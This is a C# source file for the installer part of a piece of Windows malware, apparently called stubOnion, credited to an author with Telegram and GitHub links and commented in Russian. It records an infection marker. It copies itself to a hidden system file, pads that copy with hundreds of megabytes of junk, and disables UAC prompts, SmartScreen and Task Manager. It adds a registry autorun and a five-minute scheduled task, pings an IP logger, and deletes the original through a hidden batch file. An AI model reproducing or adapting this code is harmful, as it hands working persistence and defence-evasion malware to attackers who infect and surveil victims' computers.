/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using Changer;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace stubOnion
{
    class Installer
    {
        public static string Dir = Help.WorkingDir;

        public static void GetInstall()
        {
            if (File.Exists(Help.LocalData + "\\" + Help.HWID))
            {
                if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID))
                {
                    //Вырубить показ скрытых файлов если включенно
                    new Thread(() =>
                    {
                        Thread.Sleep(new Random(Environment.TickCount).Next(60000, 340000));
                        try
                        {
                            RegistryKey rkey = Registry.CurrentUser;
                            rkey = rkey.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced");
                            rkey.SetValue("Hidden", 0);
                        }
                        catch { }
                    }).Start();

                }
                else
                {
                }
            }

            else
            {
                try
                {
                    //Файл детект заражения
                    File.Create(Help.LocalData + "\\" + Help.HWID);
                    File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);

                    DirectoryInfo Edir;
                    Edir = Directory.CreateDirectory(Dir);
                    Directory.CreateDirectory(Dir);
                    Edir.Refresh();

                    Thread.Sleep(new Random(Environment.TickCount).Next(2000, 5000));

                    // Копируемся
                    File.Copy(Assembly.GetExecutingAssembly().Location, Dir + Help.bin);
                    File.SetAttributes(Dir + Help.bin, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);

                    // Отключаем UAC уведомления
                    new Thread(() =>
                    {
                        RegistryControl.ToogleUacAdmin(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0);
                    }).Start();

                    // Отключаем SmartScreen
                    new Thread(() =>
                    {
                        RegistryControl.ToogleSmartScreen(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", "SmartScreenEnabled", "Off");
                    }).Start();

                    // Отключаем Диспетчер Задач
                    new Thread(() =>
                    {
                        RegistryControl.ToogleTaskMandRegedit(@"Software\Microsoft\Windows\CurrentVersion\Policies", 1);
                    }).Start();

                    //Добавление в реестр
                    new Thread(() =>
                    {
                        Registration.Inizialize(true, Help.NameRegRandom, Dir + Help.bin);
                    }).Start();

                    // Добавляем байты рабочему билду
                    FileStream fs = new FileStream(Dir + Help.bin, FileMode.OpenOrCreate);
                    byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    fs.Write(clientExe, 0, clientExe.Length);
                    byte[] junk = new byte[new Random().Next(650 * 1024 * 1000, 750 * 1024 * 1000)];
                    new Random().NextBytes(junk);
                    fs.Write(junk, 0, junk.Length);
                    fs.Dispose();

                    // Пингуем логгер
                    new Thread(() => { IPLog.GetIP(); }).Start();

                    // Адекватное самоудаление и добавление в планировщик задач с интервалом в 4 минуты
                    string batch = Path.GetTempFileName() + ".bat";
                    using (StreamWriter sw = new StreamWriter(batch))
                    {
                        sw.WriteLine("@echo off");
                        sw.WriteLine("timeout 4 > NUL"); // Задержка до выполнения следуюющих команд
                        sw.WriteLine("schtasks.exe " + "/create /f /sc MINUTE /mo 5 /tn " + @"""" + Help.NameRegRandom + @"""" + " /tr " + @"""'" + Help.WorkingDir + Help.bin + @"""'"); // Прыгаем в планировщик
                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\"" + " /f /q"); // Удаляем исходный билд
                        sw.WriteLine("START " + "\"" + "\" " + "\"" + Dir + Help.bin + "\""); // Запускаем рабочий билд
                        sw.WriteLine("CD " + Path.GetTempPath()); // Переходим во временную папку юзера
                        sw.WriteLine("DEL " + "\"" + batch + "\"" + " /f /q");
                    }


                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = batch,
                        CreateNoWindow = true,
                        ErrorDialog = false,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });
                    Environment.Exit(0);
                }

                catch
                {
                    File.Delete(Help.LocalData + "\\" + Help.HWID);
                }

            }
        }

    }
}
